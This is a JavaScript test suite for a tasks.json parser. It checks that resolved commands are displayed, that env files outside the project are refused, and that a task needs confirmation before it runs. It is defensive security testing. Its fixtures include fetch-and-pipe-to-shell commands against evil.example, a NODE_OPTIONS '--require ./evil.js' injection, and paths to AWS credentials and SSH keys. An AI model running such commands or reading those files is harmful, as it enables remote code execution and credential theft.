// Pure-function tests for the .vscode/tasks.json parser. No Electron, no PTY,
// no real filesystem: every test injects readFile / realpath / existsSync and
// pins `platform`, so the same assertions hold on every OS.
//
// The three security requirements an audit raised are the point of this file:
//   (a) a task must carry the RESOLVED command line, cwd and env file, because
//       label and detail are authored by the repository, not by the user;
//   (b) options.envFile must be refused when it resolves outside the project;
//   (c) a (project, label) must be explicitly confirmed before its first run,
//       and again whenever what actually runs changes.

const { test } = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');

const {
  describeResolvedTask,
  describeTaskRun,
  isInsideRoot,
  isTaskTrusted,
  loadTasksFromText,
  parseEnvText,
  parseJsonc,
  quoteForDisplay,
  recordTaskTrust,
  forgetTaskTrust,
  resolveEnvFile,
  resolveTaskGraph,
  taskRunFingerprint,
  trustKey,
} = require('../task-config');

// A project root spelled for whatever platform the suite is running on, so
// path.resolve/relative behave the way they will in the app.
const ROOT = path.resolve(path.sep === '\\' ? 'C:\\proj' : '/proj');
const OUTSIDE = path.resolve(path.sep === '\\' ? 'C:\\elsewhere' : '/elsewhere');

function load(tasks, options = {}) {
  const text = JSON.stringify({ version: '2.0.0', ...tasks });
  return loadTasksFromText(text, {
    workspaceFolder: ROOT,
    platform: 'linux',
    env: {},
    existsSync: () => true,
    ...options,
  });
}

function byLabel(tasks, label) {
  const found = tasks.find(task => task.label === label);
  assert.ok(found, `no task labelled ${label}`);
  return found;
}

// ── (a) the popover must show what actually runs ─────────────────────────

test('(a) a shell task carries its resolved command line, not just its label', () => {
  // The label and detail are written by whoever wrote the repo. Upstream's
  // popover showed only those two, so this row would read
  // "Build (compiles the project)" and nothing else.
  const [task] = load({
    tasks: [{
      label: 'Build',
      detail: 'compiles the project',
      type: 'shell',
      command: 'curl https://evil.example/x.sh | sh',
    }],
  });
  assert.equal(task.label, 'Build');
  assert.equal(task.detail, 'compiles the project');
  assert.equal(task.commandLine, 'curl https://evil.example/x.sh | sh');
  assert.equal(task.cwd, ROOT);
});

test('(a) a shell command is shown verbatim — quoting it would hide the pipe', () => {
  const [task] = load({ tasks: [{ label: 'x', type: 'shell', command: 'a && b; c | d' }] });
  assert.equal(task.commandLine, 'a && b; c | d');
});

test('(a) args are quoted individually so whitespace is visible as one token', () => {
  const [task] = load({
    tasks: [{ label: 'x', type: 'process', command: '/bin/echo', args: ['one two', 'plain', "it's"] }],
  });
  assert.equal(task.commandLine, "/bin/echo 'one two' plain 'it'\\''s'");
});

test('(a) ${workspaceFolder} and ${env:...} are resolved before display', () => {
  const [task] = load({
    tasks: [{ label: 'x', type: 'process', command: '${workspaceFolder}/run.sh', args: ['${env:TOKEN}'] }],
  }, { env: { TOKEN: 'abc123' } });
  // Substitution is textual, so the separator the author wrote survives:
  // on Windows this is "C:\proj/run.sh". That is deliberate — the command
  // line must be what the shell is actually handed, not a tidied version.
  assert.equal(task.commandLine, `${ROOT}/run.sh abc123`);
});

test('(a) an npm task shows the argv it will actually run', () => {
  const [task] = load({ tasks: [{ label: 'dev', type: 'npm', script: 'start', args: ['--port', '3000'] }] });
  assert.match(task.commandLine, /^npm(\.cmd)? run start -- --port 3000$/);
});

test('(a) options.cwd is resolved, so a task escaping the project is visible', () => {
  const [task] = load({
    tasks: [{ label: 'x', type: 'shell', command: 'ls', options: { cwd: '${workspaceFolder}/../secrets' } }],
  });
  assert.equal(task.cwd, path.resolve(ROOT, '..', 'secrets'));
  assert.equal(isInsideRoot(ROOT, task.cwd), false);
});

test('(a) env NAMES travel to the renderer, env VALUES do not', () => {
  const [task] = load({
    tasks: [{ label: 'x', type: 'shell', command: 'ls', options: { env: { API_TOKEN: 'sk-live-xyz', MODE: 'dev' } } }],
  });
  const described = describeResolvedTask(task);
  assert.deepEqual(described.envKeys, ['API_TOKEN', 'MODE']);
  assert.equal(JSON.stringify(described).includes('sk-live-xyz'), false);
});

test('(a) describeTaskRun expands a compound into every command it spawns', () => {
  // Confirming "dev" must not show the word "Compound task": the commands it
  // launches are what the user is actually authorizing.
  const tasks = load({
    tasks: [
      { label: 'dev', dependsOn: ['api', 'web'], dependsOrder: 'sequence' },
      { label: 'api', type: 'shell', command: 'node server.js' },
      { label: 'web', type: 'shell', command: 'vite --host' },
    ],
  });
  const description = describeTaskRun(tasks, 'dev');
  assert.equal(description.type, 'compound');
  assert.deepEqual(description.steps.map(step => step.commandLine), ['node server.js', 'vite --host']);
});

test('(a) quoteForDisplay leaves a Windows path readable but quotes a space', () => {
  assert.equal(quoteForDisplay('C:\\Program/bin\\x.exe'), 'C:\\Program/bin\\x.exe');
  assert.equal(quoteForDisplay('C:\\Program Files\\x.exe'), "'C:\\Program Files\\x.exe'");
  assert.equal(quoteForDisplay(''), "''");
});

// ── (b) envFile containment ──────────────────────────────────────────────

test('(b) isInsideRoot accepts the root and its descendants', () => {
  assert.equal(isInsideRoot(ROOT, ROOT), true);
  assert.equal(isInsideRoot(ROOT, path.join(ROOT, '.env')), true);
  assert.equal(isInsideRoot(ROOT, path.join(ROOT, 'a', 'b', '.env')), true);
});

test('(b) isInsideRoot rejects a parent, a traversal and a name-prefix sibling', () => {
  assert.equal(isInsideRoot(ROOT, path.dirname(ROOT)), false);
  assert.equal(isInsideRoot(ROOT, path.resolve(ROOT, '..', '..', '.ssh', 'id_rsa')), false);
  // The case a startsWith() check gets wrong: "/proj-evil" is not in "/proj".
  assert.equal(isInsideRoot(ROOT, `${ROOT}-evil${path.sep}.env`), false);
});

test('(b) an absolute envFile outside the project is refused and never read', () => {
  // Upstream: `path.isAbsolute(expanded) ? expanded : ...` — so this path was
  // read as-is and its contents became the child process environment.
  let readAttempts = 0;
  const secret = path.join(OUTSIDE, 'credentials');
  const tasks = load({
    tasks: [{ label: 'steal', type: 'shell', command: 'env', options: { envFile: secret } }],
  }, {
    readFile: () => { readAttempts += 1; return 'AWS_SECRET_ACCESS_KEY=hunter2\n'; },
    realpath: p => p,
  });
  const task = byLabel(tasks, 'steal');
  assert.equal(readAttempts, 0, 'the file must not be opened at all');
  assert.equal(task.envFile.status, 'rejected');
  assert.equal(task.supported, false);
  assert.deepEqual(task.env, {});
  assert.deepEqual(task.envKeys, []);
  assert.match(task.error, /outside the project root/);
});

test('(b) a relative envFile that traverses out is refused', () => {
  const tasks = load({
    tasks: [{ label: 'x', type: 'shell', command: 'env', options: { envFile: '../../.ssh/config' } }],
  }, { readFile: () => { throw new Error('must not read'); }, realpath: p => p });
  assert.equal(byLabel(tasks, 'x').envFile.status, 'rejected');
});

test('(b) ${userHome} cannot be used to reach out of the project either', () => {
  const tasks = load({
    tasks: [{ label: 'x', type: 'shell', command: 'env', options: { envFile: '${userHome}/.npmrc' } }],
  }, { userHome: OUTSIDE, readFile: () => { throw new Error('must not read'); }, realpath: p => p });
  assert.equal(byLabel(tasks, 'x').envFile.status, 'rejected');
});

test('(b) a symlink inside the project pointing out is refused — lexical checks miss this', () => {
  const link = path.join(ROOT, 'innocent.env');
  const tasks = load({
    tasks: [{ label: 'x', type: 'shell', command: 'env', options: { envFile: 'innocent.env' } }],
  }, {
    readFile: () => { throw new Error('must not read'); },
    realpath: p => (p === link ? path.join(OUTSIDE, '.aws', 'credentials') : p),
  });
  const task = byLabel(tasks, 'x');
  assert.equal(task.envFile.status, 'rejected');
  assert.equal(task.supported, false);
});

test('(b) an in-project envFile is read and its names (not values) are exposed', () => {
  const tasks = load({
    tasks: [{ label: 'x', type: 'shell', command: 'env', options: { envFile: '.env' } }],
  }, {
    readFile: (p) => {
      assert.equal(p, path.join(ROOT, '.env'));
      return 'PORT=3000\nSECRET=shhh\n';
    },
    realpath: p => p,
  });
  const task = byLabel(tasks, 'x');
  assert.equal(task.envFile.status, 'loaded');
  assert.deepEqual(task.envFile.keys, ['PORT', 'SECRET']);
  assert.equal(task.env.SECRET, 'shhh');
  // The renderer-facing view never carries the value.
  assert.equal(JSON.stringify(describeResolvedTask(task)).includes('shhh'), false);
});

test('(b) a refused task is unrunnable — resolveTaskGraph will not schedule it', () => {
  const tasks = load({
    tasks: [{ label: 'x', type: 'shell', command: 'env', options: { envFile: path.join(OUTSIDE, '.env') } }],
  }, { readFile: () => { throw new Error('must not read'); }, realpath: p => p });
  assert.throws(() => resolveTaskGraph(tasks, 'x'), /outside the project root/);
});

test('(b) a refused envFile on a dependency blocks the compound that needs it', () => {
  const tasks = load({
    tasks: [
      { label: 'dev', dependsOn: ['leak'] },
      { label: 'leak', type: 'shell', command: 'env', options: { envFile: path.join(OUTSIDE, '.env') } },
    ],
  }, { readFile: () => { throw new Error('must not read'); }, realpath: p => p });
  assert.throws(() => resolveTaskGraph(tasks, 'dev'), /outside the project root/);
});

test('(b) refusing one task leaves the rest of the file usable', () => {
  // Failing the whole tasks.json would punish the user for the attacker's row.
  const tasks = load({
    tasks: [
      { label: 'bad', type: 'shell', command: 'env', options: { envFile: path.join(OUTSIDE, '.env') } },
      { label: 'good', type: 'shell', command: 'npm test' },
    ],
  }, { readFile: () => { throw new Error('must not read'); }, realpath: p => p });
  assert.equal(tasks.length, 2);
  assert.equal(byLabel(tasks, 'good').supported, true);
  assert.equal(byLabel(tasks, 'good').commandLine, 'npm test');
});

test('(b) a worktree may read the parent repo it inherits its tasks from', () => {
  const worktree = path.join(ROOT, '.claude', 'worktrees', 'feature');
  const parentEnv = path.join(ROOT, '.env');
  const tasks = loadTasksFromText(
    JSON.stringify({ version: '2.0.0', tasks: [{ label: 'x', type: 'shell', command: 'env', options: { envFile: '${workspaceFolder}/.env' } }] }),
    {
      workspaceFolder: worktree,
      fallbackWorkspaceFolder: ROOT,
      platform: 'linux',
      env: {},
      existsSync: () => true,
      realpath: p => p,
      readFile: (p) => {
        if (p === parentEnv) return 'PORT=1\n';
        const error = new Error('ENOENT');
        error.code = 'ENOENT';
        throw error;
      },
    },
  );
  const task = byLabel(tasks, 'x');
  assert.equal(task.envFile.status, 'loaded');
  assert.equal(task.envFile.resolved, parentEnv);
});

test('(b) the inherited fallback is still only the two roots, not anywhere', () => {
  const worktree = path.join(ROOT, '.claude', 'worktrees', 'feature');
  const tasks = loadTasksFromText(
    JSON.stringify({ version: '2.0.0', tasks: [{ label: 'x', type: 'shell', command: 'env', options: { envFile: path.join(OUTSIDE, '.env') } }] }),
    {
      workspaceFolder: worktree,
      fallbackWorkspaceFolder: ROOT,
      platform: 'linux',
      env: {},
      existsSync: () => true,
      realpath: p => p,
      readFile: () => { throw new Error('must not read'); },
    },
  );
  assert.equal(byLabel(tasks, 'x').envFile.status, 'rejected');
});

test('(b) every place an envFile can be declared goes through the same gate', () => {
  // tasks.json lets envFile in at six different levels, and the merge order
  // (file options -> file platform block -> task options -> task platform
  // block) means a check placed on only one of them is not a check. Each of
  // these must be refused, and the file must never be opened.
  const evil = path.join(OUTSIDE, '.aws', 'credentials');
  const shapes = {
    'task options.envFile': { tasks: [{ label: 'x', type: 'shell', command: 'env', options: { envFile: evil } }] },
    'task bare envFile': { tasks: [{ label: 'x', type: 'shell', command: 'env', envFile: evil }] },
    'file-level options': { options: { envFile: evil }, tasks: [{ label: 'x', type: 'shell', command: 'env' }] },
    'task platform block': { tasks: [{ label: 'x', type: 'shell', command: 'env', windows: { options: { envFile: evil } } }] },
    'file platform block': { windows: { options: { envFile: evil } }, tasks: [{ label: 'x', type: 'shell', command: 'env' }] },
    'npm task': { tasks: [{ label: 'x', type: 'npm', script: 'start', options: { envFile: evil } }] },
    'compound parent': {
      tasks: [
        { label: 'x', dependsOn: ['y'], options: { envFile: evil } },
        { label: 'y', type: 'shell', command: 'env' },
      ],
    },
  };

  for (const [shape, definition] of Object.entries(shapes)) {
    let reads = 0;
    const tasks = loadTasksFromText(JSON.stringify({ version: '2.0.0', ...definition }), {
      workspaceFolder: ROOT,
      platform: 'win32',
      env: {},
      existsSync: () => true,
      realpath: p => p,
      readFile: () => { reads += 1; return 'AWS_SECRET_ACCESS_KEY=hunter2\n'; },
    });
    const task = byLabel(tasks, 'x');
    assert.equal(reads, 0, `${shape}: the env file was opened`);
    assert.equal(task.envFile?.status, 'rejected', `${shape}: not refused`);
    assert.equal(task.supported, false, `${shape}: still runnable`);
    assert.equal(JSON.stringify(task.env).includes('hunter2'), false, `${shape}: value leaked`);
  }
});

test('(b) resolveEnvFile with no envFile reports "none" and reads nothing', () => {
  const result = resolveEnvFile(null, { workspaceFolder: ROOT, readFile: () => { throw new Error('no'); } });
  assert.equal(result.status, 'none');
  assert.deepEqual(result.env, {});
});

// ── (c) first-run confirmation ───────────────────────────────────────────

test('(c) a task is untrusted until it is recorded', () => {
  const tasks = load({ tasks: [{ label: 'build', type: 'shell', command: 'make' }] });
  const fingerprint = taskRunFingerprint(describeTaskRun(tasks, 'build'), tasks);
  assert.equal(isTaskTrusted({}, ROOT, 'build', fingerprint), false);
  const store = recordTaskTrust({}, ROOT, 'build', fingerprint);
  assert.equal(isTaskTrusted(store, ROOT, 'build', fingerprint), true);
});

test('(c) trust is per project — the same label in another project still asks', () => {
  const tasks = load({ tasks: [{ label: 'build', type: 'shell', command: 'make' }] });
  const fingerprint = taskRunFingerprint(describeTaskRun(tasks, 'build'), tasks);
  const store = recordTaskTrust({}, ROOT, 'build', fingerprint);
  assert.equal(isTaskTrusted(store, OUTSIDE, 'build', fingerprint), false);
});

test('(c) confirming "build" does not confirm "test"', () => {
  const tasks = load({
    tasks: [
      { label: 'build', type: 'shell', command: 'make' },
      { label: 'test', type: 'shell', command: 'make check' },
    ],
  });
  const store = recordTaskTrust({}, ROOT, 'build', taskRunFingerprint(describeTaskRun(tasks, 'build'), tasks));
  assert.equal(isTaskTrusted(store, ROOT, 'test', taskRunFingerprint(describeTaskRun(tasks, 'test'), tasks)), false);
});

test('(c) the confirmation is bound to the command, not the label', () => {
  // The attack this exists for: "build" is trusted once, then the next pull
  // rewrites its command. A label-keyed grant would run it silently.
  const before = load({ tasks: [{ label: 'build', type: 'shell', command: 'make' }] });
  const after = load({ tasks: [{ label: 'build', type: 'shell', command: 'curl evil.sh | sh' }] });
  const store = recordTaskTrust({}, ROOT, 'build', taskRunFingerprint(describeTaskRun(before, 'build'), before));
  assert.equal(isTaskTrusted(store, ROOT, 'build', taskRunFingerprint(describeTaskRun(after, 'build'), after)), false);
});

test('(c) re-parsing the same file yields the same fingerprint — no nuisance re-prompt', () => {
  const a = load({ tasks: [{ label: 'build', type: 'shell', command: 'make', detail: 'x' }] });
  const b = load({ tasks: [{ label: 'build', type: 'shell', command: 'make', detail: 'x' }] });
  assert.equal(
    taskRunFingerprint(describeTaskRun(a, 'build'), a),
    taskRunFingerprint(describeTaskRun(b, 'build'), b),
  );
});

test('(c) editing only the detail text does not re-prompt', () => {
  // detail is a caption. It changes nothing about what runs, and re-prompting
  // on it would train the user to click through.
  const a = load({ tasks: [{ label: 'build', type: 'shell', command: 'make', detail: 'old' }] });
  const b = load({ tasks: [{ label: 'build', type: 'shell', command: 'make', detail: 'new' }] });
  assert.equal(
    taskRunFingerprint(describeTaskRun(a, 'build'), a),
    taskRunFingerprint(describeTaskRun(b, 'build'), b),
  );
});

test('(c) changing cwd re-prompts', () => {
  const a = load({ tasks: [{ label: 'x', type: 'shell', command: 'make' }] });
  const b = load({ tasks: [{ label: 'x', type: 'shell', command: 'make', options: { cwd: '${workspaceFolder}/sub' } }] });
  assert.notEqual(
    taskRunFingerprint(describeTaskRun(a, 'x'), a),
    taskRunFingerprint(describeTaskRun(b, 'x'), b),
  );
});

test('(c) adding an env variable re-prompts', () => {
  const a = load({ tasks: [{ label: 'x', type: 'shell', command: 'node app.js' }] });
  const b = load({
    tasks: [{ label: 'x', type: 'shell', command: 'node app.js', options: { env: { NODE_OPTIONS: '--require ./evil.js' } } }],
  });
  assert.notEqual(
    taskRunFingerprint(describeTaskRun(a, 'x'), a),
    taskRunFingerprint(describeTaskRun(b, 'x'), b),
  );
});

test('(c) changing an inline env VALUE re-prompts', () => {
  const build = value => load({
    tasks: [{ label: 'x', type: 'shell', command: 'node app.js', options: { env: { NODE_OPTIONS: value } } }],
  });
  const a = build('--max-old-space-size=4096');
  const b = build('--require ./evil.js');
  assert.notEqual(
    taskRunFingerprint(describeTaskRun(a, 'x'), a),
    taskRunFingerprint(describeTaskRun(b, 'x'), b),
  );
});

test('(c) changing a value inside an in-project .env does NOT re-prompt, but a new name does', () => {
  // Deliberate: a rotated token must not nag, but a NEW variable changes what
  // the process sees and is worth another look.
  const withEnv = body => load({
    tasks: [{ label: 'x', type: 'shell', command: 'node app.js', options: { envFile: '.env' } }],
  }, { readFile: () => body, realpath: p => p });

  const rotated = [withEnv('TOKEN=aaa\n'), withEnv('TOKEN=bbb\n')]
    .map(tasks => taskRunFingerprint(describeTaskRun(tasks, 'x'), tasks));
  assert.equal(rotated[0], rotated[1]);

  const added = withEnv('TOKEN=aaa\nNODE_OPTIONS=--require ./evil.js\n');
  assert.notEqual(rotated[0], taskRunFingerprint(describeTaskRun(added, 'x'), added));
});

test('(c) a compound re-prompts when any command in its graph changes', () => {
  // "dev" itself is untouched; only its dependency moved. Fingerprinting the
  // root task alone would miss this entirely.
  const build = webCommand => load({
    tasks: [
      { label: 'dev', dependsOn: ['api', 'web'] },
      { label: 'api', type: 'shell', command: 'node server.js' },
      { label: 'web', type: 'shell', command: webCommand },
    ],
  });
  const a = build('vite');
  const b = build('vite && curl evil.sh | sh');
  assert.notEqual(
    taskRunFingerprint(describeTaskRun(a, 'dev'), a),
    taskRunFingerprint(describeTaskRun(b, 'dev'), b),
  );
});

test('(c) trustKey separates two labels whose concatenation would collide', () => {
  assert.notEqual(trustKey('/a/b', 'c'), trustKey('/a', 'b/c'));
});

test('(c) forgetTaskTrust revokes without touching the rest of the store', () => {
  const store = recordTaskTrust(recordTaskTrust({}, ROOT, 'a', 'f1'), ROOT, 'b', 'f2');
  const next = forgetTaskTrust(store, ROOT, 'a');
  assert.equal(isTaskTrusted(next, ROOT, 'a', 'f1'), false);
  assert.equal(isTaskTrusted(next, ROOT, 'b', 'f2'), true);
});

test('(c) recordTaskTrust does not mutate the store it was given', () => {
  const store = {};
  recordTaskTrust(store, ROOT, 'a', 'f1');
  assert.deepEqual(store, {});
});

test('(c) a null fingerprint is never trusted', () => {
  // An unresolvable task has no fingerprint; "no fingerprint" must not read as
  // "matches the stored one".
  assert.equal(isTaskTrusted({ [trustKey(ROOT, 'x')]: undefined }, ROOT, 'x', null), false);
  assert.equal(isTaskTrusted({}, ROOT, 'x', undefined), false);
});

// ── vendored parsers (jsonc-parser and dotenv are not usable in this fork) ─

test('JSONC: comments and trailing commas parse', () => {
  const document = parseJsonc(`{
    // a line comment
    "version": "2.0.0", /* inline */
    "tasks": [
      { "label": "a", },
    ],
  }`);
  assert.equal(document.version, '2.0.0');
  assert.deepEqual(document.tasks, [{ label: 'a' }]);
});

test('JSONC: a // inside a string is not a comment', () => {
  const document = parseJsonc('{ "command": "curl https://example.com/x", "note": "/* not a comment */" }');
  assert.equal(document.command, 'curl https://example.com/x');
  assert.equal(document.note, '/* not a comment */');
});

test('JSONC: an escaped quote does not end the string early', () => {
  const document = parseJsonc('{ "a": "he said \\" // still a string", "b": 1 }');
  assert.equal(document.a, 'he said " // still a string');
  assert.equal(document.b, 1);
});

test('JSONC: a comma before a non-closer is left alone', () => {
  assert.deepEqual(parseJsonc('{ "a": [1, 2, 3] }').a, [1, 2, 3]);
});

test('JSONC: an unterminated block comment is an error, not silent truncation', () => {
  assert.throws(() => parseJsonc('{ "a": 1 /* oops', 'tasks.json'), /unterminated block comment/);
});

test('JSONC: a non-object document is rejected', () => {
  assert.throws(() => parseJsonc('[1,2]', 'tasks.json'), /expected a JSON object/);
  assert.throws(() => parseJsonc('nope', 'tasks.json'), /tasks\.json:/);
});

test('.env: quoting, comments, export and escapes', () => {
  const env = parseEnvText([
    '# a comment',
    'PLAIN=value',
    'export EXPORTED=yes',
    'SPACED = trimmed ',
    'DQ="a b # not a comment"',
    'SQ=\'raw \\n stays\'',
    'ESCAPED="line1\\nline2"',
    'INLINE=value # trailing comment',
    'EMPTY=',
    'no_equals_here',
  ].join('\n'));
  assert.equal(env.PLAIN, 'value');
  assert.equal(env.EXPORTED, 'yes');
  assert.equal(env.SPACED, 'trimmed');
  assert.equal(env.DQ, 'a b # not a comment');
  assert.equal(env.SQ, 'raw \\n stays');
  assert.equal(env.ESCAPED, 'line1\nline2');
  assert.equal(env.INLINE, 'value');
  assert.equal(env.EMPTY, '');
  assert.equal('no_equals_here' in env, false);
});

test('.env: a quoted value may span lines', () => {
  const env = parseEnvText('KEY="line1\nline2"\nNEXT=1\n');
  assert.equal(env.KEY, 'line1\nline2');
  assert.equal(env.NEXT, '1');
});

test('.env: an unquoted value that is only a # is a comment, as dotenv has it', () => {
  // Checked against the real dotenv (present here as a dev-only transitive
  // dep): dotenv.parse('COLOR=#ff0000') is {COLOR: ''} too. Quote it to keep
  // the value. Pinned so the vendored parser cannot drift from the library it
  // replaces.
  assert.equal(parseEnvText('COLOR=#ff0000\n').COLOR, '');
  assert.equal(parseEnvText('COLOR="#ff0000"\n').COLOR, '#ff0000');
});

// ── regressions kept from the upstream behaviour ─────────────────────────

test('an unresolvable editor variable degrades one row, not the file', () => {
  const tasks = load({
    tasks: [
      { label: 'lint file', type: 'shell', command: 'eslint ${file}' },
      { label: 'lint all', type: 'shell', command: 'eslint .' },
    ],
  });
  assert.equal(byLabel(tasks, 'lint file').supported, false);
  assert.match(byLabel(tasks, 'lint file').error, /Unsupported task variable \$\{file\}/);
  assert.equal(byLabel(tasks, 'lint all').supported, true);
});

test('a dependency cycle is reported rather than looping', () => {
  const tasks = load({
    tasks: [
      { label: 'a', dependsOn: ['b'] },
      { label: 'b', dependsOn: ['a'] },
    ],
  });
  assert.throws(() => resolveTaskGraph(tasks, 'a'), /cycle detected/);
});

test('a duplicate label fails the file — two rows cannot share one run', () => {
  assert.throws(() => load({
    tasks: [
      { label: 'x', type: 'shell', command: 'a' },
      { label: 'x', type: 'shell', command: 'b' },
    ],
  }), /duplicate task label/);
});

test('a non-2.0.0 tasks.json is refused', () => {
  assert.throws(
    () => loadTasksFromText(JSON.stringify({ version: '0.1.0', tasks: [] }), { workspaceFolder: ROOT }),
    /only tasks\.json version 2\.0\.0 is supported/,
  );
});

test('a platform override wins over the base command', () => {
  const definition = {
    tasks: [{
      label: 'x',
      type: 'shell',
      command: 'ls',
      windows: { command: 'dir' },
      linux: { command: 'ls -la' },
    }],
  };
  assert.equal(load(definition, { platform: 'win32' })[0].commandLine, 'dir');
  assert.equal(load(definition, { platform: 'linux' })[0].commandLine, 'ls -la');
});
